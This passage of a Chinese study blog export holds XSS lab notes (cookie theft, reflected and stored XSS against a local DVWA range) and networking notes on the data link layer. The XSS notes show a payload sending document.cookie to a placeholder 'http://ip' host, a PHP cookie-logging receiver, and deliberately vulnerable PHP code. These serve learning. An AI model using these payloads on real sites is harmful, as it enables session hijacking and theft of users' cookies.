alt="image-20230413211219895"></p><p>STFW，看到了这个</p><blockquote><p>仅改变井号后面的内容，只会使浏览器滚动到相应的位置，并不会重现加载页面。</p></blockquote><p>改变策略，同样在井号输入aaaa。但是只回车一次，没反应。然后右键，重新加载</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213050839.png" alt="image-20230413213050839"></p><p>起到了和两次回车一样的效果：</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213131563.png" alt="image-20230413213131563"></p><p>可见改变井号后面的内容，然后回车时，这属于是修改操作，没有重新加载页面。</p><p>而点击URL，再次按回车时，此时的回车会导致页面重新加载。</p><p>所以会不会是因为缓存的原因？</p><p>再次请GPT出山</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413213225519.png" alt="image-20230413213225519"></p><p>第一次回车时，由于没有重新加载页面，此时井号后面添加的脚本还没有被缓存到浏览器</p><p>第二次回车时，浏览器重新加载了页面，此时井号后面的脚本被缓存到了浏览器，并被加载执行。</p><h4 id="问题解决。"><a href="#问题解决。" class="headerlink" title="问题解决。"></a>问题解决。</h4><h2 id="题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。"><a href="#题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。" class="headerlink" title="题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。"></a>题外话：问GPT一个问题时，不要轻信第一次的回答，多问几次，自己再上网求证。</h2>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS盗取cookie</title>
      <link href="/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9B%97%E5%8F%96cookie/"/>
      <url>/2023/04/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E7%9B%97%E5%8F%96cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h1><h2 id="cookie概念"><a href="#cookie概念" class="headerlink" title="cookie概念"></a>cookie概念</h2><blockquote><p>cookie是在http协议下，由web服务器保存在用户客户端上的小文本文件，常包含有关用户的信息</p></blockquote><h2 id="盗取cookie关键代码"><a href="#盗取cookie关键代码" class="headerlink" title="盗取cookie关键代码"></a>盗取cookie关键代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://ip/cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></table></figure><p>cookie.php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="但是……在实操时遇到了点问题"><a href="#但是……在实操时遇到了点问题" class="headerlink" title="但是……在实操时遇到了点问题"></a>但是……在实操时遇到了点问题</h2><p>我在WWW根目录下新建了个文件夹cookieCatch，在里面写了一个cookie.php，新建了个cookie.txt放弹回来的cookie。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413002445978.png" alt="image-20230413002445978"></p><p>然而，我在url上添加这串payload并回车时，什么事也没有发生……（在dvwa靶场进行测试，已确定安全等级为low，没做过滤）</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413002850368.png" alt="image-20230413002850368"></p><p>在文本框输入这串payload时，确实重定向到我写的php页面了。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413005102987.png"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003053541.png" alt="image-20230413003053541"></p><p>但是打开cookie.txt只看到这些。。。。</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003200916.png" alt="image-20230413003200916"></p><p>啊？</p><p>我觉得可能是浏览器的问题。打开控制台输入如下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003429193.png" alt="image-20230413003429193"></p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003513851.png" alt="image-20230413003513851"></p><p>以上使用的是edge浏览器，我又换成了谷歌浏览器，结果还是同样的结果。。。</p><p>查看cookie 确认是有东西的</p><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230413003737707.png" alt="image-20230413003737707"></p><p>搞不明白了。。。</p><h2 id="搞明白了"><a href="#搞明白了" class="headerlink" title="搞明白了"></a>搞明白了</h2><p>因为服务器端在setCookie时添加了httpOnly属性（设置为true）</p><blockquote><p>httpOnly： 如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容</p></blockquote><p>因此设置了httpOnly属性后，js脚本是不能读取cookie的。</p><p>问题解决。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层</title>
      <link href="/2023/04/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2023/04/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%89%E7%AB%A0%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章 数据链路层"></a>第三章 数据链路层</h1><hr><h2 id="本章主要内容"><a href="#本章主要内容" class="headerlink" title="本章主要内容"></a>本章主要内容</h2><ol><li>点对点信道和广播信道的特点，以及对应协议（ppp）（CSMA/CD）的特点</li><li>三个基本问题：封装成帧、透明传输、差错检测</li><li>以太网mac层的硬件地址</li><li>适配器、转发器、集线器、网桥、以太网交换机的作用以及使用场合。</li></ol><h3 id="3-1-数据链路层的几个共同问题"><a href="#3-1-数据链路层的几个共同问题" class="headerlink" title="3.1 数据链路层的几个共同问题"></a>3.1 数据链路层的几个共同问题</h3><p>链路：</p><blockquote><p>从下一个节点到相邻结点的一段物理线路，中间无其他交换结点。</p></blockquote><p>数据链路：</p><blockquote><p>物理线路以及实现一些必要的通信协议的硬件和软件</p></blockquote><h4 id="1-封装成帧"><a href="#1-封装成帧" class="headerlink" title="1. 封装成帧"></a>1. 封装成帧</h4><p>给一段数据前后分别加上首部和尾部，便于接收端从比特流中辨认帧的开始和结束位置</p><h4 id="2-透明传输"><a href="#2-透明传输" class="headerlink" title="2. 透明传输"></a>2. 透明传输</h4><p>无论什么样的比特组合的数据，都能按照原样没有差错地通过数据链路层</p><p>也就是说：如果数据中出现了和帧界定符一样的比特组合时，就要采取有效的措施来解决这个问题。</p><h4 id="3-差错检测"><a href="#3-差错检测" class="headerlink" title="3. 差错检测"></a>3. 差错检测</h4><p>传输过程会出现差错（比特差错）难以避免。若判定有差错，那就简单地丢弃这个帧。</p><hr><h3 id="3-2-点对点协议PPP"><a href="#3-2-点对点协议PPP" class="headerlink" title="3.2 点对点协议PPP"></a>3.2 点对点协议PPP</h3><p>点对点协议：</p><blockquote><p>PPP (Point-to-Point Protocol)</p></blockquote><h4 id="ppp协议的特点"><a href="#ppp协议的特点" class="headerlink" title="ppp协议的特点"></a>ppp协议的特点</h4><blockquote><p>互联网用户只有连接某个ISP才能接入互联网。PPP协议就是用户计算机和ISP进行通信时所使用的 <em>数据链路层</em> 协议</p></blockquote><p>PPP协议的组成：</p><ul><li><p>一个将IP数据报封装到串行链路的方法。</p></li><li><p>一个用于建立、配置、测试链路连接的 <strong>链路控制协议</strong> LCP(Link Control Protocol)</p></li><li><p>一套<strong>网络控制协议</strong>，这些协议用于支持不同的网络层协议，如IP</p></li></ul><h5 id="1-各字段的意义"><a href="#1-各字段的意义" class="headerlink" title="1. 各字段的意义"></a>1. 各字段的意义</h5><h5 id="2-字节填充"><a href="#2-字节填充" class="headerlink" title="2. 字节填充"></a>2. 字节填充</h5><h5 id="3-零比特填充"><a href="#3-零比特填充" class="headerlink" title="3. 零比特填充"></a>3. 零比特填充</h5><h4 id="ppp协议的工作状态"><a href="#ppp协议的工作状态" class="headerlink" title="ppp协议的工作状态"></a>ppp协议的工作状态</h4><hr><h3 id="3-3-使用广播信道的数据链路层"><a href="#3-3-使用广播信道的数据链路层" class="headerlink" title="3.3 使用广播信道的数据链路层"></a>3.3 使用广播信道的数据链路层</h3><p>关键词：以太网、局域网</p><p>局域网使用的就是广播信道。</p><h4 id="3-3-1-局域网的数据链路层"><a href="#3-3-1-局域网的数据链路层" class="headerlink" title="3.3.1 局域网的数据链路层"></a>3.3.1 局域网的数据链路层</h4><p>局域网具以下优点：</p><blockquote><ul><li><p>具有广播功能</p></li><li><p>便于系统拓展和逐渐地演变</p></li><li><p>提高了系统的可靠性、可用性、生存性</p></li></ul></blockquote><p>共享信道要解决用户合理共享信道的问题，解决方法如下：</p><blockquote><ul><li><p>静态划分信道</p><p> 频分复用、时分复用、波分复用、码分复用</p></li></ul><ul><li><p>动态媒体接入控制</p><p> 又称为多点接入，信道并非时在用户通信时固定分配给用户</p><ul><li>随机接入：所有用户随机发送信息，可能会产生碰撞。</li><li>受控接入：用户不能随机发送信息，必须服从一定的控制。</li></ul></li></ul></blockquote><h5 id="1-以太网的两个主要标准"><a href="#1-以太网的两个主要标准" class="headerlink" title="1. 以太网的两个主要标准"></a>1. 以太网的两个主要标准</h5><blockquote><ul><li>DIX Ethernet V2</li><li>IEEE 802.3</li></ul></blockquote><p>以上两个标准只有很小的差别</p><p>很多人把采用802.3标准的局域网简称为以太网</p><p>以太网采用<strong>无连接</strong>的工作方式，不必先建立连接就可以直接发送数据。</p><p>以太网提供的服务是 尽最大努力的交付  即不可靠的交付</p><h5 id="2-适配器的作用"><a href="#2-适配器的作用" class="headerlink" title="2. 适配器的作用"></a>2. 适配器的作用</h5><blockquote><p>计算机与外部局域网的连接需要通过适配器</p></blockquote><p>适配器本是主机箱内插入的一块网络接口板，这种接口板又称为网络接口卡，简称网卡。</p><p>现在计算机上已经嵌入了这种适配器，不再使用单独的网卡了</p><h4 id="3-3-2-CSMA-CD协议"><a href="#3-3-2-CSMA-CD协议" class="headerlink" title="3.3.2 CSMA/CD协议"></a>3.3.2 CSMA/CD协议</h4><blockquote><p>CSMA/CD: 载波监听多点接入/碰撞检测(Carrier Sense Multiple Access with Collision Detection)</p></blockquote><h5 id="几个概念："><a href="#几个概念：" class="headerlink" title="几个概念："></a>几个概念：</h5><p>载波监听</p><blockquote><p>边发送边监听。 不管在数据发送前还是数据发送中，每个站都必须不停地检测信道。保证不在其他站发送数据时发送数据，产生干扰。</p></blockquote><p>多点接入</p><blockquote><p>说明是总线型网路，许多计算机以多点接入的方式连接在一根总线上。</p></blockquote><p>碰撞检测</p><blockquote><p>适配器边发送数据，边检测信道上的信号电压的变化情况。当两个或者几个站同时发送数据时，总线上的电压会增大（互相叠加），表明发生了碰撞。一旦发现总线出现了碰撞，适配器就要立即停止发送数据。</p></blockquote><p>尽管有以上技术作为保证，数据在总线上仍然会出现碰撞。（数据在总线上传输是有延时的，上一秒还没监听到信号，下一秒可能信号就传到了，但己方已经把数据发出去了）</p><p>因为同一时间只能有一个站在发送信息，因此只能进行半双工通信，不能进行全双工通信。</p><p>争用期</p><blockquote><p>以太网端到端往返时间 2τ 数据发送后，经过这段时间还没有检测到碰撞，才能肯定这次发送一定不会产生碰撞。</p></blockquote><p>基本退避时间为争用期2τ 具体的争用期时间是51.2微秒</p><p>当数据发送不成功时就要重传，从0—2*k-1  这些整数中随机选出一个数，这个数乘以2τ 就是推迟重传时间（不一定要推迟，可以立即发送）</p><p>当重传16次仍然不成功，那么就丢弃该帧，并向高层报告。（这种情况表明同一时间想发送数据的站太多）</p><p>最短帧</p><p>如果发送的帧很短，那么可能会出现以下情况</p><blockquote><p>发送方发完了这个很短的帧，没有检测到碰撞，但是实际上在发送后这个帧与其他站发送的数据产生了碰撞。</p></blockquote><p>这种情况会导致发送方不知道发送失败了，因此不会重传（数据永久丢失了）</p><p>为了避免这种情况，以太网规定帧长最短不能小于64字节</p><p>最短帧是64字节</p><p>凡是小于64字节的帧都是无效帧，都应该被丢弃</p><p>帧间最小间隔</p><blockquote><p>9.6微秒 </p></blockquote><p>作用是防止接收方来不及反应，留出时间处理上一个帧的缓存</p><p>强化碰撞：</p><p>当发送数据的站检测到碰撞以后，除了立即停止发送数据以外，还需要发送人为的干扰信号，方便让所有站都知道已经发生了碰撞</p><h4 id="3-3-3-使用集线器的星型拓扑"><a href="#3-3-3-使用集线器的星型拓扑" class="headerlink" title="3.3.3 使用集线器的星型拓扑"></a>3.3.3 使用集线器的星型拓扑</h4><h5 id="几个概念"><a href="#几个概念" class="headerlink" title="几个概念"></a>几个概念</h5><p>10BASE-T标准</p><blockquote><p>10代表10Mbit/s的数据率   base代表信号是基带信号   T代表双绞线</p></blockquote><p>10BASS-F </p><blockquote><p>与10BASE-T类似，F代表光纤</p></blockquote><p>集线器</p><blockquote><p>位于星型拓扑以太网的中心，取代了单一的总线</p></blockquote><p>集线器工作在物理层，只进行转发，不负责碰撞检测。</p><h4 id="3-3-4-以太网的信道利用率"><a href="#3-3-4-以太网的信道利用率" class="headerlink" title="3.3.4 以太网的信道利用率"></a>3.3.4 以太网的信道利用率</h4><p>成功发送一个帧所经历的时间是 T0+τ</p><p>T0: 完整发送一个帧的时间</p><p>τ：从信道起点到终点传输过程中经历的时间</p><blockquote><p>a: 单程端到端时延 τ 与帧的发送时间 T0 之比</p></blockquote><p>a = τ/T0</p><p>a越小，信道利用率越高。 因为a趋近于0时，表示一旦发生碰撞，就能马上检测出来，并立即停止发送。因而信道资源被浪费的时间很少。</p><h4 id="3-3-5-以太网的mac层"><a href="#3-3-5-以太网的mac层" class="headerlink" title="3.3.5 以太网的mac层"></a>3.3.5 以太网的mac层</h4><p>MAC地址：单独表示每个适配器，每个MAC地址全球唯一</p><p>MAC帧的格式：</p><blockquote><p>后面补充</p></blockquote><p>适配器的过滤功能：</p><blockquote><p>适配器每从网络上收到一个mac帧，先用硬件检查帧中的目的地址。如果是发往本站的就收下，如果不是，那就丢弃。</p></blockquote><h3 id="3-4-拓展的以太网"><a href="#3-4-拓展的以太网" class="headerlink" title="3.4 拓展的以太网"></a>3.4 拓展的以太网</h3><h4 id="3-4-1-在物理层拓展以太网"><a href="#3-4-1-在物理层拓展以太网" class="headerlink" title="3.4.1 在物理层拓展以太网"></a>3.4.1 在物理层拓展以太网</h4><p>涉及到的设备：</p><ul><li>光纤和调制解调器：拓展主机和集线器之间的距离</li><li>集线器：代替总线</li></ul><p>涉及的概念：</p><blockquote><p>碰撞域： 又称为冲突域。在这个域内，同一时间只能有一个设备在发数据，否则就会冲突。</p></blockquote><blockquote><p>碰撞域的最大吞吐量： 假设三个系通过集线器连接起来，其中每个系的最大吞吐量都是10Mbit/s 那这个连接起来的碰撞域的最大吞吐量就是30Mbit/s</p></blockquote><p>注意： 如果不同的系使用不同的以太网技术（如：数据率不同），就不能用集线器将他们互联起来。</p><p>如果一个系使用10Mbit/s的适配器，另外的系使用10/100Mbit/s的适配器，连起来后，就只能支持10Mbit/s的工作速率。因为集线器只能转发，不能缓存。</p><h4 id="3-4-2-在数据链路层拓展以太网"><a href="#3-4-2-在数据链路层拓展以太网" class="headerlink" title="3.4.2 在数据链路层拓展以太网"></a>3.4.2 在数据链路层拓展以太网</h4><p>涉及到的设备：</p><ul><li>网桥：根据收到的帧根据其MAC帧目的地址进行转发和过滤。</li><li>交换机：工作在数据链路层，实质上是一个多端口的网桥，每个端口都与一台单独的主机或另一台交换机相连，工作在全双工模式。</li></ul><p>涉及到的概念：</p><blockquote><p>交换机的自学习： 当交换机收到一个帧时，先检测交换表里有没有这个帧目的地址设备的记录，如果有就可以确定需要转发的端口；如果没有，则先在交换表记录下发送这个帧的设备的MAC地址和帧的来源端口，再对除来源端口外的其他端口进行广播。这个过程一直循环，最后交换表里就会存储有连接这台交换机所有站的MAC地址和对应连接端口。</p><p>交换表： 交换机是一种即插即用的设备，其内部有张交换表（地址表），通过自学习，交换表里会存储连接这台交换机的所有站的MAC地址和连接的端口，以便在收到新的帧时，只需要检测帧的目的地址就能直接确定调用哪个端口</p><p>”兜圈子“问题：当网络中存在冗余链路（如：两台交换机存在一个环形回路）时，可能会导致以太网帧再某个环路中无线兜圈子，白白消耗了网络资源。</p><p>解决兜圈子问题的方案：在逻辑上切断环路。IEEE的802.1D标准制定的生成树协议STP</p></blockquote><h4 id="3-4-2-虚拟局域网"><a href="#3-4-2-虚拟局域网" class="headerlink" title="3.4.2 虚拟局域网"></a>3.4.2 虚拟局域网</h4><p>虚拟局域网的作用：</p><blockquote><p>缩小广播域，把一个大的以太网，在逻辑上分割成几个小的以太网，每个小的以太网各自成为新的广播域</p></blockquote><h3 id="3-5-高速以太网"><a href="#3-5-高速以太网" class="headerlink" title="3.5 高速以太网"></a>3.5 高速以太网</h3><p>100BASE-T 以太网</p><blockquote><p>Fast Ethernet快速以太网   在双绞线上传输 100Mbit/s基带信号的星型拓扑以太网，仍使用IEEE802.3的 CSMA/CD 协议。</p></blockquote><p>吉比特以太网</p><blockquote><p>使用802.3z标准，具有以下特点：</p><ul><li>允许在1Gbit/s下以全双工和半双工两种方式工作。</li><li>使用IEEE802.3协议规定的帧格式</li><li>半双工下使用CSMA/CD协议，全双工下不使用</li><li>与10BASE-T和100BASE-T技术向后兼容</li></ul></blockquote><p>10吉比特以太网</p><blockquote><p>帧的格式没有变化。</p><p>只工作在全双工模式。因此不存在争用问题，不适用CSMA/CD协议。</p></blockquote><h3 id="3-6-使用以太网进行宽带接入"><a href="#3-6-使用以太网进行宽带接入" class="headerlink" title="3.6 使用以太网进行宽带接入"></a>3.6 使用以太网进行宽带接入</h3><p>把ppp协议中的ppp帧封装到以太网中来传输————PPPoE（PPP over Ethernet）</p><p>例： 使用光纤到大楼方案（FTTB），用光纤连接每栋大楼，在每栋大楼的楼梯口安装一个光网络单元ONU ，根据用户所申请的带宽，使用5类线接到用户家中。用户只需要用5类线把自己的个人电脑连接到墙上的RJ-45接口上，然后在PPPoE的弹出窗口输入自己在运营商处购买的用户名和密码，就可以进行宽带上网了。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 数据链路层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞基础</title>
      <link href="/2023/04/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/04/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>xss 跨站脚本攻击(Cross Site Scripting)</p><p>其实应该简称为css，但是这与层叠样式表的缩写重合了，因此改名xss。</p><p>攻击者会在web页面中的input表单、url、留言板等位置插入js代码，导致用户访问时触发，达到攻击目的。</p></blockquote><hr><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>服务器对用户提交的数据没做过滤，或者过滤不严，导致浏览器把用户的输入当成了js代码并直接返回给客户端执行。</p><hr><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>反射型（非持久）</li><li>存储型（持久）</li><li>DOM型（非持久）</li></ul><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><h5 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h5><h6 id="攻击者：发现存在反射型xss的url-gt-构造xss代码-gt-进行编码、缩短（增加迷惑性）-gt-发送给受害者"><a href="#攻击者：发现存在反射型xss的url-gt-构造xss代码-gt-进行编码、缩短（增加迷惑性）-gt-发送给受害者" class="headerlink" title="攻击者：发现存在反射型xss的url  -&gt;  构造xss代码   -&gt;   进行编码、缩短（增加迷惑性）  -&gt;  发送给受害者"></a>攻击者：发现存在反射型xss的url  -&gt;  构造xss代码   -&gt;   进行编码、缩短（增加迷惑性）  -&gt;  发送给受害者</h6><h6 id="受害者：收到链接并点开-gt-xss代码执行"><a href="#受害者：收到链接并点开-gt-xss代码执行" class="headerlink" title="受害者：收到链接并点开  -&gt;  xss代码执行"></a>受害者：收到链接并点开  -&gt;  xss代码执行</h6><blockquote><p>攻击对受害者而言是一次性的。</p></blockquote><p>例：</p><p>php源代码： 发现未做过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试:  在输入框输入xss探针、payload进行测试 发现构造的脚本被执行了</p><p>URL:   观察URL结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=</span><br></pre></td></tr></table></figure><p>构造：  插入脚本语句 <script>alert("xss");</script></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E</span><br></pre></td></tr></table></figure><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>应用程序通过web请求获取数据，在未检验是否存在xss代码的情况下就存入数据库。用户下一次请求从数据库中获取该数据的时候，该程序也没进行过滤，最终用户浏览器界面执行xss代码。</p><p>这种xss漏洞的影响是持久性的。由于xss代码被储存在了数据库中，因此每当用户获取这些数据时都会获取到xss代码。只要xss代码仍在数据库中存在，这个过程就还会重现。</p><p>这种类型的xss常见于网站的评论区。用户提交了包含xss代码的留言到数据库，当目标用户查询留言时，留言中的xss代码就会加载出来并被当成脚本执行。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>攻击者： 发现存在存储型xss  -&gt;  构造xss代码并提交至网站数据库中</p><p>受害者： 点开目标网站，网站服务端将恶意代码从数据库中取出，拼接在html发送给受害者的浏览器  -&gt; 受害者浏览器收到响应后解析执行，同时恶意代码也被执行</p><p>例：</p><p>php源代码：发现未做过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 